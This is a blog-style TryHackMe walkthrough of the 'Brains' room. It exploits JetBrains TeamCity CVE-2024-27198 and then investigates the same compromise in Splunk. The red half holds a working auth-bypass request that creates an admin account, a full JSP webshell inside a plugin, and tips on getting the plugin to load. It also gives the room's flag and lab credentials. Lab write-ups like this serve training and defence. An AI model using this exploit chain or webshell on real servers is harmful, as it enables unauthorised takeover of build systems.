---
title: "TryHackMe Brains: TeamCity CVE-2024-27198 RCE and Splunk DFIR"
date: 2026-11-22T19:06:00+05:30
lastmod: 2026-11-22T19:06:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-brains/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Hackathon
  - TeamCity
  - CVE-2024-27198
  - authentication bypass
  - RCE
  - plugin upload
  - Splunk
  - DFIR
  - threat hunting

draft: false
description: "TryHackMe Brains walkthrough: JetBrains TeamCity CVE-2024-27198 auth bypass to a plugin webshell RCE for the user flag, then Splunk forensics on the attack."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Brains |![Brains room icon](https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1721215647417)|

Brains is an easy TryHackMe room from the Hackathon set, and it is a tidy red-to-blue loop on a single vulnerability. Task 1 is the offensive half: exploit a JetBrains TeamCity server through CVE-2024-27198 and read the user flag. Task 2 is the defensive half: the IT department hands you a Splunk instance holding the logs of that same compromise, and you play Forensics Analyst to recover the attacker footprints. If you enjoyed the pipeline angle in my [CI/CD and Build Security walkthrough](/post/thm-room-cicdandbuildsecurity/), this is the same build-server attack surface, and the blue half pairs well with the detection work in my [Splunk and Sysmon notes](/post/splunk-sysmon/).

The whole room hinges on one 2024 critical: a TeamCity authentication bypass that lets an unauthenticated attacker create an administrator, then upload a malicious plugin for code execution. The blue half is the mirror image of that chain.

## Task 1: Red, exploit the server

### Recon

A plain port scan from the lab host shows three services.

```bash
nmap -Pn -sT -sV --top-ports 1000 10.49.149.4
  # 22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
  # 80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
  # 50000/tcp open  http    Apache Tomcat (language: en)
```

Port 50000 is the interesting one. The room is named Brains, which is a nudge toward JetBrains, and a Tomcat on 50000 is the TeamCity default. A quick curl confirms the exact build.

```bash
curl -s http://10.49.149.4:50000/login.html | grep -i 'TeamCity 20'
  # TeamCity 2023.11.3 (build 147512)
```

TeamCity 2023.11.3 sits below the 2023.11.4 fix line for **CVE-2024-27198**, a path-handling authentication bypass. By requesting a non-existent path with a crafted `jsp` query parameter, TeamCity routes the request to an authenticated REST endpoint without ever checking auth.

### Auth bypass: create an admin

The bypass primitive is a request to any non-existent resource (here `/hax`) with `?jsp=/app/rest/<endpoint>;.jsp`. That is enough to POST to the user-creation REST API and grant the new account the global `SYSTEM_ADMIN` role.

```bash
curl -s -X POST \
  "http://10.49.149.4:50000/hax?jsp=/app/rest/users;.jsp" \
  -H "Content-Type: application/json" \
  --data '{"username":"sysadm","password":"REDACTED","email":"x@x.local",
           "roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'
  # <user username="sysadm" id="11" ...>
  #   <roles><role roleId="SYSTEM_ADMIN" scope="g" .../></roles>
  # </user>
```

One detail that matters for the blue half later: the account lands as **id 11**. The real attacker in the Splunk data used that same bypass, so their admin also shows up as user id 11.

With admin creds I minted a token and confirmed the box has no projects, VCS roots, or connected build agents, which rules out the easy build-step execution path. The intended route to code execution is a malicious plugin.

### Plugin webshell: the part that bites

CVE-2024-27198 is usually paired with a plugin upload for RCE. TeamCity serves JSPs that ship inside a server plugin, so a plugin that carries a webshell JSP gives command execution. The upload endpoint is `/admin/pluginUpload.html` (multipart field `file:fileToUpload`), and the plugin is activated with a `setEnabled` POST to `/admin/plugins.html`.

The trap here, and where I lost real time, is the plugin layout. A JSP dropped loosely into a top-level `buildServerResources/` directory does not work: an uploaded plugin's loose web resources are not copied into Tomcat's docBase, so the JSP never compiles and you get "JSP file not found." The structure that actually works packages the JSP **inside the server jar**, and the descriptor must declare a separate classloader so the plugin loads live:

```
updatechecker.zip
  teamcity-plugin.xml            # <deployment use-separate-classloader="true" node-responsibilities-aware="true"/>
  server/
    updatechecker.jar
      buildServerResources/
        updatechecker.jsp         # the webshell, inside the jar
```

The JSP is a minimal command runner:

```jsp
<%@ page import="java.util.Scanner" %>
<%
  String op="", q=request.getParameter("cmd");
  if (q!=null){
    ProcessBuilder pb=new ProcessBuilder("/bin/bash","-c",q);
    pb.redirectErrorStream(true);
    Scanner sc=new Scanner(pb.start().getInputStream()).useDelimiter("\\A");
    op=sc.hasNext()?sc.next():op;
  }
%>
<%= op %>
```

A second trap: TeamCity derives a plugin's internal id deterministically from its name, and it will not hot-reload a plugin whose name is already loaded, even after delete. Reusing one name left me re-enabling a stale copy over and over. Uploading under a **fresh plugin name** gave a clean load, and the webshell went live at `/plugins/<name>/<name>.jsp` with no server restart.

```bash
curl -s "http://10.49.149.4:50000/plugins/metricsagent/metricsagent.jsp" \
  --data-urlencode "cmd=id; cat /home/ubuntu/flag.txt"
  # uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),...,27(sudo),...
  # THM{faa9bac345709b6620a6200b484c7594}
```

The user flag is **`THM{faa9bac345709b6620a6200b484c7594}`**, sitting in `/home/ubuntu/flag.txt`. For the record, the TeamCity process runs as `ubuntu`, which is in the `sudo` group with passwordless sudo, so this webshell is already one `sudo` away from full root.

{{< ad >}}

## Task 2: Blue, investigate the compromise

The blue machine is a separate deployment that boots a Splunk instance on port 8000 (`splunk` / `analyst123`). One gotcha worth noting: if the box has been up long enough for the trial licence to lapse, Splunk reverts to a free licence that only lets the `admin` user log in, so authenticate as `admin` rather than `splunk` if the given account is refused.

A first inventory query shows exactly three data sources, one per question.

```
index=* earliest=0 | stats count by index, sourcetype
  # auth_logs   auth_logs            506
  # main        packages            3659
  # weblogs     teamcity_activities   58
```

Note that the live attacked host from Task 1 is clean: there is no `eviluser` in `/etc/passwd` and no attacker plugin on disk. The evidence lives only in these backdated logs, which is the whole point of the forensic exercise. The attack happened on 04 July 2024.

### The backdoor user

Filtering the auth log for account creation isolates the odd one out. Legitimate system accounts (`ubuntu`, `fwupd-refresh`) were created on install day; one user was created mid-attack.

```
index=auth_logs "new user: name=" | rex "new user: name=(?<nu>[^,]+)" | stats count by nu
  # eviluser        (Jul  4 22:32:37, UID=1001, from=/dev/pts/0)
  # fwupd-refresh   (Aug  2, system)
  # ubuntu          (Jul  2, install)
```

The backdoor account created after exploitation is **`eviluser`**, UID 1001, dropped from an interactive pty during the attack window.

### The malicious package

The `packages` source is a dpkg status feed with 3659 events, almost all legitimate base packages. Scoping to the attack day surfaces a single hand-rolled install.

```
index=main sourcetype=packages install earliest=07/04/2024 latest=07/05/2024
  # 2024-07-04 22:58:25 install datacollector:amd64 <none> 1.0
  # 2024-07-04 22:58:25 status installed datacollector:amd64 1.0
```

The malicious-looking package is **`datacollector`**, version 1.0, installed minutes after the backdoor user. The innocuous name and the lonely 1.0 version are the tells.

### The plugin

The TeamCity audit log ties the whole chain back to the upload. Searching for plugin activity returns the attacker's artefact directly.

```
index=weblogs sourcetype=teamcity_activities plugin
  # [2024-07-04 22:08:31] ACTIVITIES.AUDIT - plugin_uploaded:
  #   Plugin "AyzzbuXY" was updated by "user with id=11" with comment
  #   "Plugin was uploaded to /home/ubuntu/.BuildServer/plugins/AyzzbuXY.zip"
```

The plugin installed after exploitation is **`AyzzbuXY.zip`**, and the `user with id=11` confirms it was uploaded by the same auth-bypass admin that CVE-2024-27198 creates. This is my own id-11 account from Task 1 reflected back in the historical data, which is a neat way to see that the red and blue halves are the same attack.

## Takeaways

Two things worth carrying out of this room.

First, TeamCity plugin RCE is a packaging problem as much as a vulnerability. The auth bypass is trivial, but the webshell only fires when the JSP lives inside the server jar and the descriptor opts into a separate classloader. Loose web resources in an uploaded plugin never reach Tomcat's compiler, and the deterministic plugin id means a stale name will silently block reloads. Upload under a fresh name.

Second, the blue half shows how cleanly a single intrusion scatters across unrelated log sources. The authentication log held the backdoor user, the package manager feed held the malware, and the application audit log held the delivery vehicle and the attacker's user id. No single source told the whole story, but the shared timestamp of 04 July 2024 stitched them together, and the TeamCity `user id=11` is the thread that proves the plugin upload and the CVE are the same event.

Room solved 100%: 2 tasks, 4 answers.
